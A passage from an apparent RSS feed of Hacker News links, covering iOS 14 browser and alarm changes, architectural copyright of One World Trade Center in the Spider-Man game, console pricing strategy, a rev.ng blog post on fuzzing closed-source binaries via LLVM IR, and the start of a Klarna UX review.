<figure><img src="https://firt.imgix.net/img/notes/ios14/browser-fb.png?auto=format" alt="" loading="lazy" data-src="https://firt.imgix.net/img/notes/ios14/browser-fb.png?auto=format" width="1125" height="1408"><figcaption>Facebook Mobile Browser also shows an 'Open in Safari' menu item that now may open a different browser</figcaption></figure>
<p>For example, Facebook Mobile Browser has a menu item to "Open in Safari" that opens Chrome instead, if the latter is defined as default.</p>
<p>As far as I know today, there will be no way now to open a URL in Safari.  Apps that let you choose the browser you prefer to open links should change their behavior. Feedly is one example of this kind of Apps.</p>
<figure><img src="https://firt.imgix.net/img/notes/ios14/browser-feedly.png?auto=format" alt="" loading="lazy" data-src="https://firt.imgix.net/img/notes/ios14/browser-feedly.png?auto=format" width="1125" height="1063"><figcaption>Feedly lets you define your preferred browser; this will be a problem from iOS …</figcaption></figure></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://firt.dev/ios-14">https://firt.dev/ios-14</a></em></p>]]>
            </description>
            <link>https://firt.dev/ios-14</link>
            <guid isPermaLink="false">hacker-news-small-sites-24502728</guid>
            <pubDate>Thu, 17 Sep 2020 09:41:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Is 1 World Trade Center Missing from Spider-Man?]]>
            </title>
            <description>
<![CDATA[
Score 173 | Comments 116 (<a href="https://news.ycombinator.com/item?id=24502706">thread link</a>) | @tosh
<br/>
September 17, 2020 | https://www.stevenbuccini.com/why-1wtc-isnt-in-spiderman | <a href="https://web.archive.org/web/*/https://www.stevenbuccini.com/why-1wtc-isnt-in-spiderman">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Like many people across the world, I’m using my quarantine effectively: by catching up on all the video games I wasn’t able to play while traveling. The game at the top of my list? <a href="https://en.wikipedia.org/wiki/Spider-Man_(2018_video_game)">Spider-Man</a>, which was widely recognized as one of the top games of 2018. The game is features an open-world, which means you can travel around the game map as you see fit. And since Spider-Man, canonically, lives in real-life New York City, this means you’ll spend hours webbing around an incredibly detailed version of the city that never sleeps.</p>

<p>If you’ve spent any appreciable amount of time in New York, the in-game world will immediately feel familiar. The developers nailed the look and feel of the city. I found myself using real-world landmarks to orient myself as I slinged (slunged?) across Manhattan. The game leans into this realism—it even includes a challenge where you can take photos of in-game landmarks. While some are unique to the Marvel universe, like Avengers Tower and Uncle Ben’s grave, many exist in the real world and are faithfully reproduced within the game: Williamsburg/Brooklyn/Manhattan/Queensboro Bridges all make an appearance, as does Grand Central, Madison Square Garden, Saint Patrick’s Cathedral, Columbus Circle, the High Line and many more points of reference. As you’re swinging through the city, you’re treated to great views of Manhattan’s skyline, anchored by the Empire State Building, Chrysler Building, and Freedom Tower. Except, it’s <em>not</em> the Freedom Tower, despite being located in the exact same location as its real-life counterpart. Why are equally famous buildings like the Empire State Building accurately depicted, but the Freedom Tower isn’t?</p>

<p>Here’s what the “Freedom Tower” looks like in the game:
<img src="https://www.stevenbuccini.com/assets/spiderman/spiderman-1wtc.png" alt="In-Game 1WTC">
<em>(credit to Polygon because I was too lazy to get this off my PS4 myself)</em></p>

<p>Interestingly enough, the in-game design looks to be based on Libeskind’s original design for Freedom Tower (an interesting recap of the changes can be found <a href="https://www.newyorker.com/business/currency/daniel-libeskinds-world-trade-center-change-of-heart">here</a>), lending further credence to the theory that this building is supposed to be 1WTC.</p>

<p>My curiosity was further piqued when I learned that the <em>real</em> One World Trade Center was actually in the game during a demo at E3 in June of 2018, less than 4 months before the final game was set to be released to the public!</p>

<p><img src="https://www.stevenbuccini.com/assets/spiderman/1wtc_e3.png" alt="Real-life 1WTC in Spider-Man demo from E3 2018"></p>

<p>This deadline is even closer than it appears at first glance as the <a href="https://en.wikipedia.org/wiki/Software_release_life_cycle#RTM">“gold master”</a> is finalized weeks before release date so manufacturers have time to make and distribute the game to retailers. This change must have been implemented at the 11th hour.</p>

<p>And even after swapping the model out, they featured the building prominently on the home screen in the released version of the video game!
<img src="https://www.stevenbuccini.com/assets/spiderman/spiderman-start.png" alt="Start screen">
<em>(<a href="https://www.noobfeed.com/features/1119/marvel-s-spider-man-how-do-you-access-new-game-plus-and-ultimate-difficulty">credit</a>)</em></p>

<p>So <em>why</em> isn’t the real-life 1 WTC featured? At this point, we can eliminate time and budget constraints because we know the model already existed and was implemented before launch. We know that the designers thought this building was important as it’s the first thing you notice when starting the game.</p>

<p>I wish to briefly introduce <strong>Buccini’s razor</strong>—if something fun disappears unexpectedly, the cause is litigation (real or imagined).</p>

<p>It turns out that just like an author can copyright their book and a musician can copyright a song, an architect can copyright a building. Sure enough, here’s the copyright record for One World Trade Center:
<img src="https://www.stevenbuccini.com/assets/spiderman/copyright_record.png" alt="Record from [copyright.gov](https://www.copyright.gov/); can't deeplink the record but you can find it yourself by using the document record seen above"></p>

<p>At this point, I had a strong feeling copyright law was the reason for the change. The <a href="https://www.reddit.com/r/SpidermanPS4/comments/9grnr8/freedom_tower/">internet</a> <a href="https://www.reddit.com/r/SpidermanPS4/comments/9d3paw/the_real_reason_for_the_redesigned_freedom_tower/">seems</a> <a href="https://gamefaqs.gamespot.com/boards/191635-marvels-spider-man/76988485">to</a> <a href="https://www.neogaf.com/threads/one-world-trade-center-has-been-removed-from-spider-man-ps4.1465315/">agree</a>.</p>

<p>As luck<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> would have it, there was <a href="https://www.nexsenpruet.com/professionals/jeff-reichard">an expert in architectural copyright</a> right around the corner from my house here in Greensboro! Jeffrey was kind enough to spend a few minutes of his time thinking about this not-at-all-important question.</p>

<p>First, Jeffrey noted that <em>copyrights expire</em>. Just as music and books can pass into the public domain for anyone to replicate freely, you can also build an exact replica of the Empire State Building here in the United States if you so choose. Generally, any building constructed after December 1, 1990 is covered by the <a href="https://www.djc.com/news/ae/11151054.html">Architectural Works Copyright Protection Act</a>. This would explain why older structures are replicated faithfully but the Freedom Tower is not.</p>

<p>However, this doesn’t tell the full story. As Jeffrey noted, <a href="https://www.law.cornell.edu/uscode/text/17/120">17 U.S. Code § 120(a)</a> “provides an exception related to pictorial representations of of buildings that are visible from a public place. Therefore, I am not sure exactly why they changed it in the video game.”</p>

<p>The final piece of the puzzle lies at the <a href="https://www.youtube.com/watch?v=vo5A_fuDgtk&amp;feature=youtu.be&amp;t=2666">end of the credits</a>, where the creators of the game specifically thank the owners of certain famous buildings in New York, including the Empire State Building. I found this curious as the Empire State Building should be doubly safe: it was constructed long before 1990 so it is not covered under copyright law, and it is visible from a public place so it should be exempt from any potential copyrights. But look closer. You’ll see that they are acknowledging the <em>trademark</em> holders, NOT the <em>copyright</em> holders.</p>

<p><a href="https://www.photosecrets.com/buildings-copyright-and-trademarks">As this page</a> helpfully explains, applying a trademark to the building limits how the building’s image can be used in the sale of goods and services (like video games)! The credits hint that the video game creators obtained limited licenses to use the trademark, i.e. the distinctive design and appearance of the building, for certain buildings such as the Flatiron Building.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></p>

<p>Therefore, the most likely answer is that the distinctive shape of 1 World Trade Center is either trademarked (although I could not find it within USPTO databases) or is so recognizable that it is easily defensible via a common law trademark and the game developers were unable to secure a license to use the trademark before their deadline.</p>

<p>However, <a href="https://www.youtube.com/watch?v=gHzuHo80U2M">Sony just announced</a> an expansion to the Spider-Man video game, so perhaps the additional time and the demonstrated popularity of the first installment will help resolve this issue for the upcoming title.</p>



  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://www.stevenbuccini.com/why-1wtc-isnt-in-spiderman</link>
            <guid isPermaLink="false">hacker-news-small-sites-24502706</guid>
            <pubDate>Thu, 17 Sep 2020 09:38:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[I overslept because iOS 14 disabled my alarm]]>
            </title>
            <description>
<![CDATA[
Score 485 | Comments 313 (<a href="https://news.ycombinator.com/item?id=24502697">thread link</a>) | @dewey
<br/>
September 17, 2020 | https://annoying.technology/posts/e82ff3bde8b225e6/ | <a href="https://web.archive.org/web/*/https://annoying.technology/posts/e82ff3bde8b225e6/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://d33wubrfki0l68.cloudfront.net/9261d105b12f5c6c5928c9532d1f8721b84005cd/62d1b/media/oversleeping.jpg"></p><p>I’m using the iOS <a href="https://support.apple.com/en-us/HT208655">Bedtime</a> feature for years now. With yesterday’s iOS 14 update the feature got moved from the Clock app to the Health app. Unfortunately the migration is done by disabling your existing alarm and showing a button to open the Health app to set it up again.</p><p>I woke up late and well rested today.</p></div></div>]]>
            </description>
            <link>https://annoying.technology/posts/e82ff3bde8b225e6/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24502697</guid>
            <pubDate>Thu, 17 Sep 2020 09:36:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Peculiarities of Video Console Pricing]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24502690">thread link</a>) | @tosh
<br/>
September 17, 2020 | https://www.stevenbuccini.com/console-wars | <a href="https://web.archive.org/web/*/https://www.stevenbuccini.com/console-wars">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>I saw this great meme today:</p>

<p><img src="https://www.stevenbuccini.com/assets/console-wars/meme.png" alt="Meme"></p>

<p>Here we are, about three months out from the biggest shopping period of the year. Both Microsoft and Sony announced their next-generation consoles with splashy livestreams. They announced off new titles, showed off tech demos, and talked up their hardware specs. But both events had one glaring omission: the price.</p>

<p>As it turns out, this is game theory in action. There are two main ways to make revenue in the console business: selling the hardware and taking a rake on video game sales via a licensing fee. For the most part, consoles are at feature parity. Many titles are available on both platforms and the graphics are of similar quality. Therefore, prcee is one of a few key differentiators between products, yet pricing the product correctly requires balancing many different factors.</p>

<p>We’ve seen how sensative consumers are to price in the last two generations. Sony tried to position the PlayStation 3 as a hulking machine meant for hard-core gamers who demanded the top performance, launching their the base model at $499.99. Meanwhile, the Xbox base model launched at $299. The cheaper price made the Xbox more appealing for the average family, and the Xbox moved nearly double the number of units in the US when compared to the Playstation 3.</p>

<p>But it was Microsoft who made a pricing mistake in the next genreation. They priced their console at $499, a price that was significantly higher than many expected. This was most likely to cover the cost of the Kinect sensor, which was bundled with the console at launch. Instead, it was Sony that announced that the Playstation 4 would launch ath the $399 price point that many analysts expect Microsoft to anchor at. Microsoft’s fatal mistake was to bet big on Kinect being a hit with casual gamers, even though casual gamers are much less likely to shell out big bucks for video game consoles. The PS4 has more than doubled the sales of the Xbox One.</p>

<p>Selling more consoles is crucial for another reason: per-unit profit. Consoles are overbuilt when first released. The hardware has to last for an entire “generation” which, on average, lasts about 5-7 years. Since the components are so cutting edge, they are expensive to manufacture and acquire. Even pricing consoles at their true cost, and taking no profit whatsoever, would mean setting a price so high that it is beyond the reach of many consumers. Manufacturers have decided it’s better to take a loss on the unit upfront in order to move more units. Why? Because the more units you produce, the cheaper the consoles are to make. Ordering more parts amortizes the huge upfront design expenses over a larger base and gives you greater negotiating power over your suppliers. Your employees get better at making the devices so your defect rate drops. These factors combine to increase your margins, which allows you in turn to cut the price of your console to make it even more attractive, which causes you to sell even more units, and so on.</p>

<p>The second key is that video game developers go where the gamers are. If your platform has a significant portion of the market for video games, you have more pricing power when it comes to the licensing fee you charge developers. And the larger your install base, the more games you will sell in aggregate.</p>

<p>Sony and Microsoft are probably just now ramping up their assembly lines for the holiday shopping boom. They’re probably only now understanding what their defect rate is and how certain design decisions are affecting the cost of the machine. Each knows the price that they would <em>like</em> to sell the console for. The question remains: how high can they go without getting kneecapped by the other? And is their price low enough that they can do the same to their rival? One has to wonder how long this game of chicken can go on for. But one way or another, come Black Friday, a price will be set.</p>

<p>I would encourage you to <a href="https://mitsloan.mit.edu/LearningEdge/simulations/platform-wars/Pages/default.aspx">play around with the pricing simulator</a> built by MIT/Sloan and read the associated case studies to develop a more intuitive feel for the forces at work.</p>

  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://www.stevenbuccini.com/console-wars</link>
            <guid isPermaLink="false">hacker-news-small-sites-24502690</guid>
            <pubDate>Thu, 17 Sep 2020 09:34:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Fuzzing binaries with LLVM's libFuzzer and rev.ng]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24502500">thread link</a>) | @aleclm
<br/>
September 17, 2020 | https://rev.ng/blog/fuzzing/post.html | <a href="https://web.archive.org/web/*/https://rev.ng/blog/fuzzing/post.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          


<p>In this blogpost, we show how libFuzzer, the LLVM fuzz testing library part, can be employed with rev.ng in order to perform coverage-guided blackbox fuzzing of executable binaries.
We also show that our approach is fast, semantic-preserving and simply requires to implement the <a href="https://github.com/google/fuzzing/blob/master/tutorial/libFuzzerTutorial.md#hello-world-fuzzer">harness function</a>, as occurs for programs with source code available.</p>
<p>Note that this work is based on the rev.ng lifter, the open-source component at the core of the decompiler we're building.
The <a href="https://github.com/revng/revng">publicly available</a> version is a bit outdated, but we are in the process of pushing out new versions on a more regular basis.
<a href="https://twitter.com/_revng">Stay</a> <a href="https://rev.ng/newsletter.html">tuned</a>.</p>

          
          
            <h2>Background</h2>
<p>Fuzzing is a widespread technique for discovering software security vulnerabilities, where randomly mutated inputs are fed to a target program. It underwent a breakthrough around 2014, with the introduction of <a href="https://lcamtuf.coredump.cx/afl/">AFL</a> and it has been gaining popularity steadly ever since.
Its success is in large part due to its effectiveness in identifying <a href="https://lcamtuf.coredump.cx/afl#bugs">real world security vulnerabilities</a>. What makes it innovative is its <em>coverage-based</em> fuzzing approach, which prioritizes inputs that lead to traverse previously unexplored execution paths.
This coverage information is used to drive the fuzzing strategy, and the greater the coverage, the higher the chances of finding bugs. To collect coverage information, the input program is instrumented at compile-time. Then, at run-time, new inputs are continuously generated through a feedback-mechanism.</p>
<p>Other state-of-the-art coverage-guided fuzz testing frameworks include <a href="https://llvm.org/docs/LibFuzzer.html">libFuzzer</a> and <a href="https://github.com/google/honggfuzz">Honggfuzz</a>.</p>
<p>While whitebox (source-available) fuzzing is a relatively consolidated research area, assessing the security of closed-source software is still largely an open challenge. Existing works primarily resort to <em>dynamic binary translation</em> which injects the instrumentation dynamically. Main examples comprise <a href="https://github.com/mirrorer/afl/blob/master/qemu_mode/README.qemu">AFL QEMU user-mode</a> and <a href="https://project.inria.fr/FranceJapanICST/files/2019/04/19-Kyoto-Fuzzing_Binaries_using_Dynamic_Instrumentation.pdf">Honggfuzz combined with QBDI</a>. This process is straightforward, but comes with a significant runtime overhead and, consequently, a reduced effectiveness.</p>
<p>Additionally, running a whole program can be sometimes very hard - if feasible at all.
For instance, booting a firmware image is not always manageable. In such situations, fuzzing only delimited portions of code might be a winning strategy.</p>
<h2>Our approach</h2>
<p>rev.ng features a static binary translator, that, given a Linux program compiled for architecture <em>A</em> (e.g., AArch64) can produce an equivalent program for another architecture <em>B</em> (e.g., x86-64), or even for the same architecture <em>A</em>. The input binary code is converted into a higher-level intermediate representation, LLVM IR, which makes it suitable for performing a wide range of analyses and transformations. We have been able to translate and properly execute programs of significant size and complexity such as <code>perl</code> and <code>gcc</code>.</p>
<p>Now, the intuition is that we can leverage the static binary translator to inject the necessary instrumentation to perform coverage-guided fuzzing.
This approach is purely <em>ahead-of-time</em>, since both the translation happens and the instrumentation take place offline.
This results in significantly reducing the run-time overhead.</p>
<p>More specifically, libFuzzer - which is usually employed in presence of the source code - can be combined with the recompilable LLVM IR module produced by rev.ng. The output is a standalone binary that keeps feeding new inputs to the translated program.</p>
<p>When fuzzing <em>less</em>, the terminal pager, we obtained the following results:</p>
<table>
  <thead>
    <tr>
      <th scope="col"></th>
      <th scope="col" colspan="3">Execs per second</th>
      <th scope="col">Total execs</th>
    </tr>
    <tr>
      <th scope="col"></th>
      <th scope="col">1min</th>
      <th scope="col">10min</th>
      <th scope="col">60min</th>
      <th scope="col">60min</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <th scope="row">afl</th>
      <td>3 582</td>
      <td>3 495</td>
      <td>3 682</td>
      <td>13 187 952</td>
    </tr>
    <tr>
      <th scope="row">rev.ng</th>
      <td>15 0617</td>
      <td>79 701</td>
      <td>78 306</td>
      <td>271 217 728</td>
    </tr>
  </tbody>
</table>
<p>Compared with AFL in QEMU-mode, we got speedups ranging from 20× to 40×.
Check out <a href="https://rev.ng/downloads/iccst-18-paper.pdf">our previous paper</a> for a more detailed rundown on performance.</p>
<p>As a result, our approach supports <strong>in-memory coverage-guided fuzzing</strong> of individual functions even when the source code is not available.
Since, by design, one can fuzz, for instance, an ARM binary after translating it to x86-64, it is architecture-independent as well.
Moreover we can test distinct portions of code separately, without executing the whole program. This is particularly beneficial, for instance, for self-contained libraries and embedded firmwares.</p>
<p>Here is an overview of the fuzzing process. At the last stage of our optimization passes, the fuzzing framework produces, among other things, a C header declaring all the collected functions for the user.
After creating the harness function, the compiler driver is called to build the fuzzer binary.</p>
<p><img alt="overview" src="https://rev.ng/blog/fuzzing/overview.svg"></p>
<h2>The fuzzing process</h2>
<p>Briefly, our fuzzing framework aims to:</p>
<ol>
<li>preserve functional correctness and achieve good performance;</li>
<li>enable fuzzing of individual functions;</li>
<li>enable hooking of functions;</li>
<li>reuse existing sanitizers.</li>
</ol>
<p>At this stage, these goals are achieved by implementing three LLVM passes that run over the recompilable unit of LLVM IR: an instrumentation pass (<em>PatchReturn</em>), a pass that generates helper stubs and C headers for every lifted function (<em>WrapperGen</em>), and a pass for function hooking when needed (<em>FuncHook</em>).</p>
<h3>Functional correctness and performance</h3>
<p>Two major challenges typical in static binary translation are preserving both semantics correctness and performance of the original program. To have both, we adopt a two-fold approach, which consists in:</p>
<ol>
<li>Collecting all the basic blocks of the original program in a single LLVM function (known as <code>root</code>). While not extremely fast and prone to less optimizations, this guarantees functional correctness.</li>
<li>Identifying the start and end addresses of every function and isolating their code into distinct LLVM functions (so called <em>isolated functions</em>). This allows for more aggressive optimizations, but may be subject to inaccuracies in the CFG-recovering phase.</li>
</ol>
<p>The <code>root</code> function is intended to start the execution and migrate it to the appropriate isolated function, where it will stay for most of the time.
A caveat though: since function boundaries detection and data code separation boil down to be an undecidable problem, we need a way to continue flawlessly with the execution if, for instance, an unexpected jump target is met in an isolated function. 
Without such a mechanism, semantic correctness would not be guaranteed. To address this issue, we let the code run at full speed while inside an isolated function, and fall back to <code>root</code> only if an unforeseen jump, e.g., a misidentified return instruction, is encountered.</p>
<p>As a comparison, see how the <code>root</code> function and the isolated <code>main</code> (known as <em>revng translated block</em>) respectively look like in the LLVM IR:</p>
<div><pre><span></span><span>define</span> <span>void</span> <span>@root</span> <span>()</span> <span>{</span>
<span>dispatcher:</span>
    <span>%1</span> <span>=</span> <span>load</span> <span>i64</span><span>,</span> <span>i64</span><span>*</span> <span>@pc</span>
    <span>switch</span> <span>i64</span> <span>%1</span> <span>[</span>
        <span>i64</span> <span>0x1000</span><span>,</span> <span>label</span> <span>%rtb_main</span>
        <span>i64</span> <span>0x2000</span><span>,</span> <span>label</span> <span>%rtb_func1</span>
        <span>i64</span> <span>0x3000</span><span>,</span> <span>label</span> <span>%rtb_func2</span>
    <span>]</span>

<span>rtb_main:</span>
    <span>; Load rdi and rsi</span>
    <span>call</span> <span>void</span> <span>@rtb_main</span><span>(</span><span>rsi</span><span>,</span> <span>rdi</span><span>)</span>
<span>rtb_func1:</span>
    <span>call</span> <span>void</span> <span>@rtb_func1</span><span>()</span>
<span>}</span>

<span>define</span> <span>i64</span> <span>@rtb_main</span><span>(</span><span>i64</span> <span>%rsi</span><span>,</span> <span>i64</span> <span>%rdi</span><span>)</span> <span>{</span>
    <span>; Push rbp on the stack</span>
    <span>call</span> <span>void</span> <span>@rtb_func1</span><span>()</span>

    <span>; Push rbx on the stack</span>
    <span>call</span> <span>void</span> <span>@rtb_func2</span><span>()</span>
    <span>ret</span> <span>void</span>
<span>}</span>
</pre></div>
<p>As shown in the snippet, the dispatcher inside <code>root</code> is responsible for redirecting the execution to the respective isolated function as appropriate.</p>
<h3>Fuzzing of individual functions</h3>
<p>All the isolated functions found are possible candidates for fuzzing. Now, we need a way to let the translated program run so that all the initialization routines (e.g., the memory allocator) can be carried out, and pause the execution of the <em>guest</em> (the translated program) when the user-defined entrypoint is met (be it <code>main</code> or whenever we need to back out of the program).</p>
<p>This is what the first instrumentation pass is meant to do, i.e., to allow to return from any isolated function to <code>root</code>. The migration is necessary to give control back to <code>LLVMFuzzerTestOneInput</code>, the function in charge of guiding the fuzzing process.
As an example, suppose we need to initialize the program and return to the fuzzing context only once a startup routine (<code>init_vars</code>) has been executed. The transition back would be the following one:</p>
<p><img alt="flow" src="https://rev.ng/blog/fuzzing/flow.svg"></p>
<p>The snippet below shows how we insert a sentinel variable to make such a transition before returning from <code>init_vars</code>.
As can be seen, the terminator block <code>rtb_init_vars.0x1d</code>, which is supposed to return to <code>main</code>, is no longer reachable - instead, we return to <code>root</code>, which ultimately returns to <code>LLVMFuzzerTestOneInput</code>.</p>
<div><pre><span></span><span>rtb_init_vars:</span>
    <span>store</span> <span>i1</span> <span>true</span><span>,</span> <span>i1</span><span>*</span> <span>@ReturnFromFuzzing</span>
    <span>call</span> <span>void</span> <span>@unwind_back</span><span>(</span><span>i32</span> <span>0</span><span>,</span> <span>i64</span> <span>0</span><span>,</span> <span>i64</span> <span>0</span><span>,</span> <span>i64</span> <span>0</span><span>)</span>     <span>; Stack unwinding mechanism is used here to return to root</span>
    <span>unreachable</span>

<span>rtb_init_vars.0x1d:</span>                                        <span>; Basic block to return to main is now unreachable</span>
    <span>ret</span> <span>void</span>
</pre></div>
<p>The second pass, on the other hand, generates a wrapper around each isolated function in the form of a C header (<code>generated_wrappers.h</code>), thus allowing normal function invocation without inspecting the ABI used by the original program.</p>
<p>Note, though, that we cannot invoke the isolated function directly: we still need to pass through <code>root</code> in order to maintain the functional correctness. 
So, for every isolated function, whose prototype is retrieved through dedicated analyses, we set up the emulated program counter (which points to the respective isolated function), the emulated stack pointer, and the function arguments. If the function is supposed to return, a struct with the possible arguments to be returned is filled.</p>
<h3>Hooking functions</h3>
<p>The third pass allows the user to easily replace existing functions (like <code>malloc</code>, <code>free</code>, <code>send</code>, <code>recv</code> and so forth). This turns out to be useful when we want to add user-defined callbacks, logging or inject raw data, e.g., when a function expects data coming from a socket.</p>
<p>For every isolated function, we take the following steps to perform function hooking:</p>
<ol>
<li>make its symbol have <a href="https://llvm.org/docs/LangRef.html#linkage-types">weak linkage</a>;</li>
<li>clone it;</li>
<li>wrap up the original implementation in a dedicated function.</li>
</ol>
<p>This allows us to bypass the <em>One Definition Rule</em>. Hence, if a symbol is redefined, it will override the original …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://rev.ng/blog/fuzzing/post.html">https://rev.ng/blog/fuzzing/post.html</a></em></p>]]>
            </description>
            <link>https://rev.ng/blog/fuzzing/post.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24502500</guid>
            <pubDate>Thu, 17 Sep 2020 08:58:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Klarna – Making a payment is unnecessarily awkward – UX review]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24502062">thread link</a>) | @Spidery
<br/>
September 17, 2020 | https://builtformars.co.uk/how-klarna-works/ | <a href="https://web.archive.org/web/*/https://builtformars.co.uk/how-klarna-works/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section data-id="ca3ca43" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
							
							<div>
				<div>
				<div data-id="ec20c55" data-element_type="column">
			<div>
					<div>
				<div data-id="682e138" data-element_type="widget" data-widget_type="theme-post-content.default">
				<div>
					<div data-elementor-type="wp-post" data-elementor-id="8794" data-elementor-settings="[]">
			<div>
				<div>
							<section data-id="39cfc48" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="cc8b80f" data-element_type="column">
			<div>
					<div>
				<div data-id="38a613d" data-element_type="widget" data-settings="{&quot;drop_cap&quot;:&quot;yes&quot;}" data-widget_type="text-editor.default">
				<div>
					<p>Klarna is one of the biggest ‘buy-now, pay-later’ services in the world, and you’ll probably have seen their logo in a few familiar places, like ASOS, Topshop and Wayfair.</p>
				</div>
				</div>
				<div data-id="d4835f8" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>The idea is that you can buy something from one of their participating retailers, receive the item, and pay for it through Klarna later on.</p>
				</div>
				</div>
				<div data-id="a9286a0" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>And it seems to be working well. As I write this, Klarna is a $10 billion company, and they claim to process more than a million transactions every day.</p>
				</div>
				</div>
				<div data-id="06dde1a" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>So, you can imagine how meaningful a 1% improvement in their customer retention would be. Even 0.1% would be noticeable.</p>
				</div>
				</div>
				<div data-id="4d0c8b6" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>Well, let’s explore the UX mistakes that Klarna are making, and ultimately how they could improve their product fairly easily.</p>
				</div>
				</div>
				
				<div data-id="ae6fbf6" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>🎯 Recognising event-driven behaviour.</p>
				</div>
				</div>
				<div data-id="4239c47" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>🍯 How not to ask ‘are you sure?’.</p>
				</div>
				</div>
				<div data-id="ff9a088" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>⛳️ The irony of saying something is ‘easy’.</p>
				</div>
				</div>
				<div data-id="6cfaa4c" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>🗺 Always include a way back.</p>
				</div>
				</div>
				
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="82654c1" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;stretch_section&quot;:&quot;section-stretched&quot;}">
						<div>
				<div>
				<div data-id="a7cb550" data-element_type="column">
			<div>
					<div>
				
				<div data-id="206da17" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>💡<strong>Tip:</strong> Try using the ⬅️ <span>➡️ arrows on your keyboard to navigate the slides.</span></p>
				</div>
				</div>
				<div data-id="2d6c95a" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>💡<strong>Tip:</strong> Swipe <span>to navigate slides.</span></p>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="9387ec6" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;stretch_section&quot;:&quot;section-stretched&quot;}">
						<div>
				<div>
				<div data-id="bcf94c5" data-element_type="column">
			<div>
					<div>
				<div data-id="bb3ae52" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div>
<div><div role="region" aria-label="Slider"><p><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI5NjAiIGhlaWdodD0iNzIwIiA+PC9zdmc+" alt="Slider"></p></div></div>


</div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section data-id="02de3e3" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						
		</section>
				<section data-id="3128807" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
				<div>
				<div data-id="4890770" data-element_type="column">
			<div>
					<div>
				<div data-id="5132d05" data-element_type="widget" data-settings="{&quot;_animation&quot;:&quot;none&quot;}" data-widget_type="heading.default">
				<p>
			<h4>1. Event-driven behaviour</h4>		</p>
				</div>
				<div data-id="f7b7c9d" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>Sometimes—as I’m making my morning coffee—I’ll realise that we’ve run out of milk. So I rush down to my local shop, power-walking through the isles at 7am with a bottle of milk in hand.</p>
				</div>
				</div>
				<div data-id="972c566" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>It’s a very small shop, so the cashier will have seen me pull up, and use the most efficient path to go from the door, to the milk, to the till—and have Apple Pay up and ready before they open their mouth:</p>
				</div>
				</div>
				<div data-id="bc8eb43" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>“<em>Do you have a Tesco clubcard</em>?”</p>
				</div>
				</div>
				<div data-id="4faeee2" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>“<em>No.</em>” (slightly out of breath)</p>
				</div>
				</div>
				<div data-id="af7b1e9" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>“<em>Would you like to sign up <strong>now</strong></em>?”</p>
				</div>
				</div>
				<div data-id="bc124f5" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>Sure, it may be company policy to always ask, but it’s a stupid company policy.</p>
				</div>
				</div>
				<div data-id="2159a92" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<p>It’s also a perfect example of an issue that happens a lot when designing software: people misunderstanding, or not considering what is driving a user’s behaviour.</p>
				</div>
				</div>
				<div data-id="9a3a3e7" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
